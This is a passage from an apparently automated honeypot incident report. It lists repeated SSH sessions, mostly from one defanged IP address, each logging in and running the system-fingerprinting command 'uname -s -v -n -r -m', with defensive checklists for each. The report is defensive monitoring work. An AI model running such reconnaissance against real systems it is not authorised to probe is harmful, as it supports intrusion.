- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a190b8713407

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:18` | `cowrie.session.connect` |
| `2026-08-15 07:03:18` | `cowrie.client.version` |
| `2026-08-15 07:03:18` | `cowrie.client.kex` |
| `2026-08-15 07:03:20` | `cowrie.login.success` |
| `2026-08-15 07:03:21` | `cowrie.session.params` |
| `2026-08-15 07:03:21` | `cowrie.command.input` |
| `2026-08-15 07:03:21` | `cowrie.log.closed` |
| `2026-08-15 07:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-401021218c95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:25` | `cowrie.session.connect` |
| `2026-08-15 07:03:25` | `cowrie.client.version` |
| `2026-08-15 07:03:25` | `cowrie.client.kex` |
| `2026-08-15 07:03:25` | `cowrie.login.success` |
| `2026-08-15 07:03:26` | `cowrie.session.params` |
| `2026-08-15 07:03:26` | `cowrie.command.input` |
| `2026-08-15 07:03:26` | `cowrie.log.closed` |
| `2026-08-15 07:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf856679aafb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:31` | `cowrie.session.connect` |
| `2026-08-15 07:03:31` | `cowrie.client.version` |
| `2026-08-15 07:03:31` | `cowrie.client.kex` |
| `2026-08-15 07:03:32` | `cowrie.login.success` |
| `2026-08-15 07:03:32` | `cowrie.session.params` |
| `2026-08-15 07:03:32` | `cowrie.command.input` |
| `2026-08-15 07:03:33` | `cowrie.log.closed` |
| `2026-08-15 07:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a54c3e7fb6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:36` | `cowrie.session.connect` |
| `2026-08-15 07:03:36` | `cowrie.client.version` |
| `2026-08-15 07:03:36` | `cowrie.client.kex` |
| `2026-08-15 07:03:37` | `cowrie.login.success` |
| `2026-08-15 07:03:38` | `cowrie.session.params` |
| `2026-08-15 07:03:38` | `cowrie.command.input` |
| `2026-08-15 07:03:39` | `cowrie.log.closed` |
| `2026-08-15 07:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d151dbd2a3c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:42` | `cowrie.session.connect` |
| `2026-08-15 07:03:42` | `cowrie.client.version` |
| `2026-08-15 07:03:42` | `cowrie.client.kex` |
| `2026-08-15 07:03:43` | `cowrie.login.success` |
| `2026-08-15 07:03:44` | `cowrie.session.params` |
| `2026-08-15 07:03:44` | `cowrie.command.input` |
| `2026-08-15 07:03:44` | `cowrie.log.closed` |
| `2026-08-15 07:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb606ac8e528

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:49` | `cowrie.session.connect` |
| `2026-08-15 07:03:49` | `cowrie.client.version` |
| `2026-08-15 07:03:49` | `cowrie.client.kex` |
| `2026-08-15 07:03:49` | `cowrie.login.success` |
| `2026-08-15 07:03:50` | `cowrie.session.params` |
| `2026-08-15 07:03:50` | `cowrie.command.input` |
| `2026-08-15 07:03:50` | `cowrie.log.closed` |
| `2026-08-15 07:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5e79009f1ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:54` | `cowrie.session.connect` |
| `2026-08-15 07:03:54` | `cowrie.client.version` |
| `2026-08-15 07:03:54` | `cowrie.client.kex` |
| `2026-08-15 07:03:55` | `cowrie.login.success` |
| `2026-08-15 07:03:56` | `cowrie.session.params` |
| `2026-08-15 07:03:56` | `cowrie.command.input` |
| `2026-08-15 07:03:56` | `cowrie.log.closed` |
| `2026-08-15 07:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77226d505880

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:00` | `cowrie.session.connect` |
| `2026-08-15 07:04:00` | `cowrie.client.version` |
| `2026-08-15 07:04:00` | `cowrie.client.kex` |
| `2026-08-15 07:04:01` | `cowrie.login.success` |
| `2026-08-15 07:04:02` | `cowrie.session.params` |
| `2026-08-15 07:04:02` | `cowrie.command.input` |
| `2026-08-15 07:04:02` | `cowrie.log.closed` |
| `2026-08-15 07:04:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443aa7cf1cc5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:06` | `cowrie.session.connect` |
| `2026-08-15 07:04:06` | `cowrie.client.version` |
| `2026-08-15 07:04:06` | `cowrie.client.kex` |
| `2026-08-15 07:04:07` | `cowrie.login.success` |
| `2026-08-15 07:04:07` | `cowrie.session.params` |
| `2026-08-15 07:04:07` | `cowrie.command.input` |
| `2026-08-15 07:04:08` | `cowrie.log.closed` |
| `2026-08-15 07:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8663641a77d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:12` | `cowrie.session.connect` |
| `2026-08-15 07:04:12` | `cowrie.client.version` |
| `2026-08-15 07:04:12` | `cowrie.client.kex` |
| `2026-08-15 07:04:13` | `cowrie.login.success` |
| `2026-08-15 07:04:14` | `cowrie.session.params` |
| `2026-08-15 07:04:14` | `cowrie.command.input` |
| `2026-08-15 07:04:15` | `cowrie.log.closed` |
| `2026-08-15 07:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb10e787668b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:18` | `cowrie.session.connect` |
| `2026-08-15 07:04:18` | `cowrie.client.version` |
| `2026-08-15 07:04:18` | `cowrie.client.kex` |
| `2026-08-15 07:04:19` | `cowrie.login.success` |
| `2026-08-15 07:04:19` | `cowrie.session.params` |
| `2026-08-15 07:04:19` | `cowrie.command.input` |
| `2026-08-15 07:04:19` | `cowrie.log.closed` |
| `2026-08-15 07:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3b6def217b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:24` | `cowrie.session.connect` |
| `2026-08-15 07:04:24` | `cowrie.client.version` |
| `2026-08-15 07:04:24` | `cowrie.client.kex` |
| `2026-08-15 07:04:24` | `cowrie.login.success` |
| `2026-08-15 07:04:25` | `cowrie.session.params` |
| `2026-08-15 07:04:25` | `cowrie.command.input` |
| `2026-08-15 07:04:25` | `cowrie.log.closed` |
| `2026-08-15 07:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a6c5c81b41c

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:27` | `cowrie.session.connect` |
| `2026-08-15 07:04:27` | `cowrie.client.version` |
| `2026-08-15 07:04:27` | `cowrie.client.kex` |
| `2026-08-15 07:04:28` | `cowrie.login.success` |
| `2026-08-15 07:04:29` | `cowrie.session.params` |
| `2026-08-15 07:04:29` | `cowrie.command.input` |
| `2026-08-15 07:04:29` | `cowrie.log.closed` |
| `2026-08-15 07:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7f63d64f4b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:29` | `cowrie.session.connect` |
| `2026-08-15 07:04:29` | `cowrie.client.version` |
| `2026-08-15 07:04:30` | `cowrie.client.kex` |
| `2026-08-15 07:04:30` | `cowrie.login.success` |
| `2026-08-15 07:04:31` | `cowrie.session.params` |
| `2026-08-15 07:04:31` | `cowrie.command.input` |
| `2026-08-15 07:04:31` | `cowrie.log.closed` |
| `2026-08-15 07:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12257fc1804f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:35` | `cowrie.session.connect` |
| `2026-08-15 07:04:35` | `cowrie.client.version` |
| `2026-08-15 07:04:35` | `cowrie.client.kex` |
| `2026-08-15 07:04:36` | `cowrie.login.success` |
| `2026-08-15 07:04:37` | `cowrie.session.params` |
| `2026-08-15 07:04:37` | `cowrie.command.input` |
| `2026-08-15 07:04:38` | `cowrie.log.closed` |
| `2026-08-15 07:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a509050f68

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:41` | `cowrie.session.connect` |
| `2026-08-15 07:04:41` | `cowrie.client.version` |
| `2026-08-15 07:04:41` | `cowrie.client.kex` |
| `2026-08-15 07:04:42` | `cowrie.login.success` |
| `2026-08-15 07:04:43` | `cowrie.session.params` |
| `2026-08-15 07:04:43` | `cowrie.command.input` |
| `2026-08-15 07:04:43` | `cowrie.log.closed` |
| `2026-08-15 07:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc18bf3cdd1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:47` | `cowrie.session.connect` |
| `2026-08-15 07:04:47` | `cowrie.client.version` |
| `2026-08-15 07:04:47` | `cowrie.client.kex` |
| `2026-08-15 07:04:47` | `cowrie.login.success` |
| `2026-08-15 07:04:48` | `cowrie.session.params` |
| `2026-08-15 07:04:48` | `cowrie.command.input` |
| `2026-08-15 07:04:48` | `cowrie.log.closed` |
| `2026-08-15 07:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1866ee84a7c1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:53` | `cowrie.session.connect` |
| `2026-08-15 07:04:53` | `cowrie.client.version` |
| `2026-08-15 07:04:53` | `cowrie.client.kex` |
| `2026-08-15 07:04:53` | `cowrie.login.success` |
| `2026-08-15 07:04:54` | `cowrie.session.params` |
| `2026-08-15 07:04:54` | `cowrie.command.input` |
| `2026-08-15 07:04:54` | `cowrie.log.closed` |
| `2026-08-15 07:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dae36b030686

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:04 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:04:58` | `cowrie.session.connect` |
| `2026-08-15 07:04:59` | `cowrie.client.version` |
| `2026-08-15 07:04:59` | `cowrie.client.kex` |
| `2026-08-15 07:05:00` | `cowrie.login.success` |
| `2026-08-15 07:05:01` | `cowrie.session.params` |
| `2026-08-15 07:05:01` | `cowrie.command.input` |
| `2026-08-15 07:05:01` | `cowrie.log.closed` |
| `2026-08-15 07:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d2e31edd431

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:04` | `cowrie.session.connect` |
| `2026-08-15 07:05:04` | `cowrie.client.version` |
| `2026-08-15 07:05:04` | `cowrie.client.kex` |
| `2026-08-15 07:05:05` | `cowrie.login.success` |
| `2026-08-15 07:05:06` | `cowrie.session.params` |
| `2026-08-15 07:05:06` | `cowrie.command.input` |
| `2026-08-15 07:05:06` | `cowrie.log.closed` |
| `2026-08-15 07:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eab9a36df5bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:10` | `cowrie.session.connect` |
| `2026-08-15 07:05:10` | `cowrie.client.version` |
| `2026-08-15 07:05:10` | `cowrie.client.kex` |
| `2026-08-15 07:05:12` | `cowrie.login.success` |
| `2026-08-15 07:05:13` | `cowrie.session.params` |
| `2026-08-15 07:05:13` | `cowrie.command.input` |
| `2026-08-15 07:05:13` | `cowrie.log.closed` |
| `2026-08-15 07:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61d2271bddfc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:16` | `cowrie.session.connect` |
| `2026-08-15 07:05:16` | `cowrie.client.version` |
| `2026-08-15 07:05:16` | `cowrie.client.kex` |
| `2026-08-15 07:05:18` | `cowrie.login.success` |
| `2026-08-15 07:05:19` | `cowrie.session.params` |
| `2026-08-15 07:05:19` | `cowrie.command.input` |
| `2026-08-15 07:05:19` | `cowrie.log.closed` |
| `2026-08-15 07:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd18d6bfcb2e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:22` | `cowrie.session.connect` |
| `2026-08-15 07:05:22` | `cowrie.client.version` |
| `2026-08-15 07:05:22` | `cowrie.client.kex` |
| `2026-08-15 07:05:23` | `cowrie.login.success` |
| `2026-08-15 07:05:24` | `cowrie.session.params` |
| `2026-08-15 07:05:24` | `cowrie.command.input` |
| `2026-08-15 07:05:25` | `cowrie.log.closed` |
| `2026-08-15 07:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d589206dd0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:27` | `cowrie.session.connect` |
| `2026-08-15 07:05:27` | `cowrie.client.version` |
| `2026-08-15 07:05:27` | `cowrie.client.kex` |
| `2026-08-15 07:05:29` | `cowrie.login.success` |
| `2026-08-15 07:05:30` | `cowrie.session.params` |
| `2026-08-15 07:05:30` | `cowrie.command.input` |
| `2026-08-15 07:05:30` | `cowrie.log.closed` |
| `2026-08-15 07:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3149abad8ef2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:33` | `cowrie.session.connect` |
| `2026-08-15 07:05:33` | `cowrie.client.version` |
| `2026-08-15 07:05:33` | `cowrie.client.kex` |
| `2026-08-15 07:05:34` | `cowrie.login.success` |
| `2026-08-15 07:05:35` | `cowrie.session.params` |
| `2026-08-15 07:05:35` | `cowrie.command.input` |
| `2026-08-15 07:05:35` | `cowrie.log.closed` |
| `2026-08-15 07:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a1125e6b21b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:05 |
| **Last Seen** | 2026-08-15 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:05:40` | `cowrie.session.connect` |
